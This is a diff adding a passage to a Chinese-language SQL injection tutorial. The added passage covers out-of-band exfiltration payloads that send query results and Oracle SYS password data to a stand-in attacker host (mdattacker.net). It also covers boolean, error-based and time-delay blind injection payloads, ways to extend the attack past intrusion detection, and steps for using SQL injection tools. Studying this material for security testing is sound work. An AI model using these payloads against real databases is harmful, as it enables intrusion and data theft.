@@ -254,7 +254,68 @@
 
 利用数据库的一些内置功能在数据库与自己的计算机之间建立网络连接，传送从数据库中收集到的任何数据。
 
+MS-SQL:
 
+    insert into openrowset('SQLOLEDB', 'DRIVER={SQL Server};SERVER=mdataacker.net,80;UID=sa;PWD=letmein', 'select * from foo') values(@@version)
+
+Oracle:
+
+    /employees.asp?EmpNo=7521' || UTL_HTTP.request('mdattacker.net:80/'||(SELECT%20username%20FROM%20all_user%20WHERE%20ROWNUM%3d1))--
+
+    /employees.asp?EmpNo=7521' || UTL_INADDR.GET_HOST_NAME((SELECT%20PASSWORD%20FROM%20DBA_USERS%20WHERE%20NAME='SYS')||'.mdattacker.net')
+
+MySQL:
+
+    select * into outfile '\\\\mdattacker.net\\share\\output.txt' from users;
+
+利用操作系统：
+
+通常可以在数据库服务器的操作系统上执行任意命令，以此实施权限提升攻击，再采用多种手段获取数据。
+
+**使用推论：条件式响应**
+
+使用一个注入查询有条件地在数据库中触发某种可以探测的行为，然后根据这种行为是否发生推断出所需的信息。
+
+例如：SQL语句：
+
+    select * from users where username = 'admin' and password = 'password'
+
+Payload:
+
+    admin' and ascii(substring('Admin',1,1)) = 65--
+
+引发条件性错误：
+
+Oracle
+
+    select 1/0 from dual where (select username from all_users where username = 'DBSNMP') = 'DBSNMP
+
+使用时间延迟：
+
+    if ASCII(SUBSTRING('Admin',1,1)) = 64 waitfor delay '0:0:5'\
+    if (ascii(substring('Admin',1,1)) & (power(2,0))) > 0 waitfor delay '0:0:5'
+
+> 还可以通过延迟判断SQL注入。
+>
+## 扩大数据库攻击范围
+
+1. 通过提升数据库的使用权限访问其他应用程序的数据；
+2. 攻破数据库服务器的操作系统；
+3. 访问其他系统；
+4. 在主机基础架构与自己的计算机之间建立网络连接，避开入侵检测系统，传送敏感数据；
+5. 可以通过创建用户定义的功能任意扩充数据库的现有功能。
+
+## 使用SQL注入工具
+
+**渗透测试步骤：**
+
+在确定某个SQL注入漏洞后，可以考虑使用SQL注入工具来利用该漏洞，并从数据库中检索有用的数据。
+
+1. 使用拦截代理服务器运行SQL注入工具，分析该工具提交的请求以及应用程序的响应。打开工具上的任何详细输出选项，并将它的进度与观察到的查询和响应关联起来。
+
+2. 由于这些工具通常依赖预先设置的测试和特定的响应语法，因此，攻击者可能需要将数据附加或前置到这些工具注入的字符串中，以确保得到预期的响应。典型的要求包括添加注释字符、平衡服务器的SQL查询中的单引号，以及将闭括号前置或附加到字符串以与原始查询匹配。
+
+3. 如果采用了上述方法，但是查询语法仍然无效，这时，最简单的方法是创建完全受控制的嵌套查询，并使用注入工具注入该子查询。这样，注入工具就可以通过推断来提取数据。在注入标准的select和update查询时，嵌套查询非常有用。在Oracle中，嵌套查询位于insert语句中。
 
 ## 附录：
 
